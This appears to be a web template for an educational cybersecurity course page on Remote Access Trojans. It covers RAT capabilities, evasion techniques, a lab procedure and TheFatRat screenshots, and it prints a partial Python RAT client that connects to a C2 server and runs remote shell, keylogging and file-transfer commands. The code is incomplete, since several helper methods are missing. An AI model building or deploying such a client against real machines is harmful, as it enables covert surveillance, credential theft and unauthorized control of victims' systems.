<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Remote Access Trojans Analysis - Nexus Educational Platform</title>
    
    <!-- Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
<style>
    body {
        background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
        min-height: 100vh;
        font-family: 'Inter', sans-serif;
    }

    .main-container {
        background: rgba(17, 24, 39, 0.8);
        backdrop-filter: blur(20px);
        border-radius: 20px;
        border: 1px solid rgba(75, 85, 99, 0.3);
        margin: 2rem;
        padding: 3rem;
        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
    }

    .tab-navigation {
        border-bottom: 2px solid rgba(59, 130, 246, 0.3);
        margin-bottom: 2rem;
    }

    .tab-btn {
        background: transparent;
        border: none;
        padding: 1rem 2rem;
        color: #9ca3af;
        font-weight: 600;
        cursor: pointer;
        border-bottom: 3px solid transparent;
        transition: all 0.3s ease;
    }

    .tab-btn.active {
        color: #3b82f6;
        border-bottom-color: #3b82f6;
    }

    .tab-btn:hover {
        color: #3b82f6;
    }

    .tab-content {
        animation: fadeIn 0.5s ease-in-out;
    }

    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }

    .code-block {
        background: #000000;
        border-radius: 8px;
        padding: 1.5rem;
        overflow-x: auto;
        font-family: 'Fira Code', monospace;
        border: 1px solid #3b82f6;
    }

    .screenshot-gallery {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 1.5rem;
    }

    .screenshot-item {
        background: rgba(17, 24, 39, 0.6);
        border-radius: 12px;
        padding: 1rem;
        border: 1px solid rgba(59, 130, 246, 0.3);
        transition: all 0.3s ease;
        cursor: pointer;
    }

    .screenshot-item:hover {
        transform: translateY(-5px);
        border-color: #3b82f6;
        box-shadow: 0 10px 20px rgba(59, 130, 246, 0.2);
    }

    .feature-list li {
        display: flex;
        align-items: center;
        margin-bottom: 0.5rem;
    }

    .metric-item {
        background: rgba(17, 24, 39, 0.6);
        border-radius: 8px;
        padding: 1rem;
        border: 1px solid rgba(59, 130, 246, 0.3);
    }

    .step {
        background: rgba(17, 24, 39, 0.6);
        border-radius: 12px;
        padding: 1.5rem;
        border: 1px solid rgba(59, 130, 246, 0.3);
        margin-bottom: 1.5rem;
    }
</style>

<div class="main-container">
    <!-- Header -->
    <div class="text-center mb-8">
        <div class="flex items-center justify-center mb-4">
            <div class="w-20 h-20 bg-blue-600 rounded-full flex items-center justify-center mr-6">
                <i class="fas fa-desktop text-white text-3xl"></i>
            </div>
            <div>
                <h1 class="text-4xl font-bold text-white">Remote Access Trojans Analysis</h1>
                <p class="text-blue-400 text-xl">Advanced Remote Control & Surveillance Framework</p>
            </div>
        </div>
        <a href="{{ route('nexus.second-semester-phase2') }}" class="inline-flex items-center bg-gray-700 hover:bg-gray-600 text-white px-4 py-2 rounded-lg transition-all duration-300">
            <i class="fas fa-arrow-left mr-2"></i>
            Back to Phase 2
        </a>
    </div>

    <!-- Tab Navigation -->
    <div class="tab-navigation flex flex-wrap justify-center">
        <button onclick="switchTab('overview')" class="tab-btn active" id="overview-btn">Overview</button>
        <button onclick="switchTab('technical')" class="tab-btn" id="technical-btn">Technical Details</button>
        <button onclick="switchTab('implementation')" class="tab-btn" id="implementation-btn">Implementation</button>
        <button onclick="switchTab('screenshots')" class="tab-btn" id="screenshots-btn">Screenshots</button>
    </div>

    <!-- Tab Content -->
    <div id="overview" class="tab-content">
        <div class="grid md:grid-cols-2 gap-8">
            <div>
                <h3 class="text-2xl font-bold text-white mb-6">Description</h3>
                <p class="text-gray-300 mb-6 leading-relaxed">
                    Remote Access Trojans (RATs) provide unauthorized remote control capabilities over infected systems. 
                    This educational simulation demonstrates various RAT techniques including remote desktop access, 
                    keylogging, file manipulation, and covert communication channels for cybersecurity research.
                </p>
                <h4 class="text-xl font-semibold text-blue-400 mb-4">Key Capabilities:</h4>
                <ul class="feature-list text-gray-300 space-y-3">
                    <li><i class="fas fa-desktop text-blue-500 mr-3"></i>Remote desktop control and monitoring</li>
                    <li><i class="fas fa-keyboard text-blue-500 mr-3"></i>Real-time keystroke logging</li>
                    <li><i class="fas fa-camera text-blue-500 mr-3"></i>Webcam access and recording</li>
                    <li><i class="fas fa-microphone text-blue-500 mr-3"></i>Audio capture and surveillance</li>
                    <li><i class="fas fa-download text-blue-500 mr-3"></i>Bidirectional file transfer</li>
                    <li><i class="fas fa-terminal text-blue-500 mr-3"></i>Remote shell access</li>
                </ul>
            </div>
            <div>
                <h3 class="text-2xl font-bold text-white mb-6">Command & Control</h3>
                <div class="space-y-4">
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Connection Type</span>
                            <span class="text-blue-400 font-bold text-lg">TCP/HTTP</span>
                        </div>
                    </div>
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Encryption</span>
                            <span class="text-blue-400 font-bold text-lg">AES-256</span>
                        </div>
                    </div>
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Stealth Level</span>
                            <span class="text-orange-400 font-bold text-lg">High</span>
                        </div>
                    </div>
                    <div class="metric-item">
                        <div class="flex justify-between items-center">
                            <span class="text-gray-300 font-medium">Platform Support</span>
                            <span class="text-green-400 font-bold text-lg">Cross-Platform</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="technical" class="tab-content hidden">
        <h3 class="text-2xl font-bold text-white mb-6">Technical Architecture</h3>
        
        <div class="bg-gray-800 rounded-lg p-6 mb-8">
            <h4 class="text-xl font-semibold text-blue-400 mb-4">C2 Communication Protocol</h4>
            <pre class="code-block text-green-400 text-sm"><code>#!/usr/bin/env python3
# RAT Client - Educational Implementation
import socket
import threading
import subprocess
import os
import json
import base64
from cryptography.fernet import Fernet

class RATClient:
    def __init__(self, server_ip, port, encryption_key):
        """Initialize RAT client with C2 server details"""
        self.server_ip = server_ip
        self.port = port
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.cipher = Fernet(encryption_key)
        self.running = False
        
    def connect_to_server(self):
        """Establish connection to C2 server"""
        try:
            self.socket.connect((self.server_ip, self.port))
            self.running = True
            
            # Send initial system info
            system_info = self.get_system_info()
            self.send_encrypted(system_info)
            
            # Start command loop
            self.command_loop()
            
        except Exception as e:
            self.handle_error(f"Connection failed: {e}")
            
    def command_loop(self):
        """Main command processing loop"""
        while self.running:
            try:
                command = self.receive_encrypted()
                if command:
                    response = self.execute_command(command)
                    self.send_encrypted(response)
                    
            except Exception as e:
                self.handle_error(f"Command execution failed: {e}")
                break
                
    def execute_command(self, command_data):
        """Execute received command and return response"""
        cmd_type = command_data.get('type')
        cmd_args = command_data.get('args', {})
        
        if cmd_type == 'shell':
            return self.execute_shell_command(cmd_args['command'])
        elif cmd_type == 'screenshot':
            return self.take_screenshot()
        elif cmd_type == 'keylog':
            return self.get_keylog_data()
        elif cmd_type == 'file_download':
            return self.download_file(cmd_args['path'])
        elif cmd_type == 'file_upload':
            return self.upload_file(cmd_args['path'], cmd_args['data'])
        else:
            return {'status': 'error', 'message': 'Unknown command type'}
            
    def send_encrypted(self, data):
        """Send encrypted data to C2 server"""
        json_data = json.dumps(data).encode()
        encrypted_data = self.cipher.encrypt(json_data)
        self.socket.send(encrypted_data)
        
    def receive_encrypted(self):
        """Receive and decrypt data from C2 server"""
        encrypted_data = self.socket.recv(4096)
        if encrypted_data:
            decrypted_data = self.cipher.decrypt(encrypted_data)
            return json.loads(decrypted_data.decode())
        return None</code></pre>
        </div>
        
        <div class="grid md:grid-cols-2 gap-8">
            <div>
                <h4 class="text-xl font-semibold text-blue-400 mb-4">Core Modules</h4>
                <ul class="text-gray-300 space-y-3">
                    <li><strong class="text-blue-400">Screen Capture:</strong> Real-time desktop streaming and screenshots</li>
                    <li><strong class="text-blue-400">File Manager:</strong> Remote file operations and transfers</li>
                    <li><strong class="text-blue-400">Process Manager:</strong> System process control and monitoring</li>
                    <li><strong class="text-blue-400">Registry Editor:</strong> Windows registry manipulation</li>
                    <li><strong class="text-blue-400">Shell Access:</strong> Command line interface and scripting</li>
                    <li><strong class="text-blue-400">Keylogger:</strong> Keystroke capture and credential harvesting</li>
                </ul>
            </div>
            <div>
                <h4 class="text-xl font-semibold text-blue-400 mb-4">Detection Evasion</h4>
                <ul class="text-gray-300 space-y-3">
                    <li><strong class="text-orange-400">Process Injection:</strong> Hide in legitimate processes</li>
                    <li><strong class="text-orange-400">Rootkit Techniques:</strong> Kernel-level hiding mechanisms</li>
                    <li><strong class="text-orange-400">Anti-VM:</strong> Virtual machine detection and evasion</li>
                    <li><strong class="text-orange-400">Polymorphism:</strong> Code mutation and obfuscation</li>
                    <li><strong class="text-orange-400">Traffic Masking:</strong> Legitimate protocol mimicking</li>
                    <li><strong class="text-orange-400">Persistence:</strong> Multiple survival mechanisms</li>
                </ul>
            </div>
        </div>
    </div>

    <div id="implementation" class="tab-content hidden">
        <h3 class="text-2xl font-bold text-white mb-6">Controlled RAT Simulation</h3>
        
        <div class="step">
            <div class="flex items-center mb-4">
                <div class="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center mr-4">
                    <span class="text-white font-bold">1</span>
                </div>
                <h4 class="text-xl font-semibold text-white">Infrastructure Setup</h4>
            </div>
            <p class="text-gray-300 ml-14 leading-relaxed">
                Deploy isolated network environment with dedicated C2 server and multiple target systems. 
                Configure comprehensive monitoring tools to capture network traffic, system calls, and behavioral 
                patterns. Implement proper logging and analysis infrastructure for educational research.
            </p>
        </div>
        
        <div class="step">
            <div class="flex items-center mb-4">
                <div class="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center mr-4">
                    <span class="text-white font-bold">2</span>
                </div>
                <h4 class="text-xl font-semibold text-white">RAT Deployment</h4>
            </div>
            <p class="text-gray-300 ml-14 leading-relaxed">
                Execute RAT client on target systems and establish encrypted C2 communication channels. 
                Test various remote access capabilities including desktop control, file manipulation, and 
                surveillance features while monitoring all activities for defensive analysis.
            </p>
        </div>
        
        <div class="step">
            <div class="flex items-center mb-4">
                <div class="w-10 h-10 bg-blue-600 rounded-full flex items-center justify-center mr-4">
                    <span class="text-white font-bold">3</span>
                </div>
                <h4 class="text-xl font-semibold text-white">Capability Assessment</h4>
            </div>
            <p class="text-gray-300 ml-14 leading-relaxed">
                Document RAT capabilities, communication protocols, and persistence mechanisms. 
                Analyze detection challenges, develop signature-based identification methods, and 
                create comprehensive mitigation strategies for cybersecurity education and training.
            </p>
        </div>
    </div>

    <div id="screenshots" class="tab-content hidden">
        <h3 class="text-2xl font-bold text-white mb-6">RAT Control Interface</h3>
        <div class="screenshot-gallery">
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s1.png') }}" alt="RAT Control Panel" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">TheFatRat GitHub Repository</p>
                <p class="text-gray-500 text-xs">GitHub repository interface for TheFatRat malware exploitation tool</p>
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s2.png') }}" alt="RAT Control Panel" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">TheFatRat Installation Script</p>
                <p class="text-gray-500 text-xs">text-gray-500 text-xs">Script execution interface for installing TheFatRat on Kali Linux</p>
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s3.png') }}" alt="RAT Control Panel" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">TheFatRat Directory Structure</p>
                <p class="text-gray-500 text-xs">File system layout for TheFatRat installation on Kali Linux</p>            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s4.png') }}" alt="RAT Control Panel" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">RAT Control Panel</p>
                <p class="text-gray-500 text-xs">Main interface for remote system management</p>
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s5.png') }}" alt="Remote Desktop View" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Remote Desktop Access</p>
                <p class="text-gray-500 text-xs">Real-time desktop control and monitoring</p>
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s6.png') }}" alt="Remote Desktop View" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Nexus Directory Overview</p>
                <p class="text-gray-500 text-xs">File explorer interface showing the Nexus directory structure</p>            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s7.png') }}" alt="File Manager Interface" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Remote File Manager</p>
                <p class="text-gray-500 text-xs">File system navigation and manipulation</p>
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s8.png') }}" alt="File Manager Interface" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">System Information Display</p>
                <p class="text-gray-500 text-xs">Terminal interface showing system details using the sysinfo command</p>            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s9.png') }}" alt="Process Manager" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Process Manager</p>
                <p class="text-gray-500 text-xs">System process monitoring and control</p>
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s10.png') }}" alt="Keylogger Data" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Keystroke Logging</p>
                <p class="text-gray-500 text-xs">Captured keyboard input and credentials</p>
            </div>
            <div class="screenshot-item" onclick="openFullscreen(this)">
                <img src="{{ asset('images/phase 2/remoteaccess/s11.png') }}" alt="Network Monitoring" class="w-full h-48 object-cover rounded-lg mb-3">
                <p class="text-gray-400 text-sm font-medium">Network Monitoring</p>
                <p class="text-gray-500 text-xs">C2 communication and traffic analysis</p>
            </div>
        </div>
    </div>
</div>

<script>
function switchTab(tabName) {
    // Hide all tab contents
    const tabContents = document.querySelectorAll('.tab-content');
    tabContents.forEach(content => {
        content.classList.add('hidden');
    });
    
    // Remove active class from all buttons
    const tabButtons = document.querySelectorAll('.tab-btn');
    tabButtons.forEach(btn => {
        btn.classList.remove('active');
    });
    
    // Show selected tab content
    document.getElementById(tabName).classList.remove('hidden');
    
    // Add active class to clicked button
    document.getElementById(tabName + '-btn').classList.add('active');
}

function openFullscreen(element) {
    const img = element.querySelector('img');
    const overlay = document.createElement('div');
    overlay.className = 'fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 cursor-pointer';
    overlay.innerHTML = `
        <div class="relative max-w-4xl max-h-[90vh] p-4">
            <img src="${img.src}" alt="${img.alt}" class="max-w-full max-h-full object-contain">
            <button class="absolute top-4 right-4 text-white text-3xl hover:text-gray-300 bg-black bg-opacity-50 rounded-full w-12 h-12 flex items-center justify-center">&times;</button>
        </div>
    `;
    document.body.appendChild(overlay);
    
    overlay.addEventListener('click', function(e) {
        if (e.target === overlay || e.target.tagName === 'BUTTON') {
            overlay.remove();
        }
    });
}
</script>
</body>
</html>
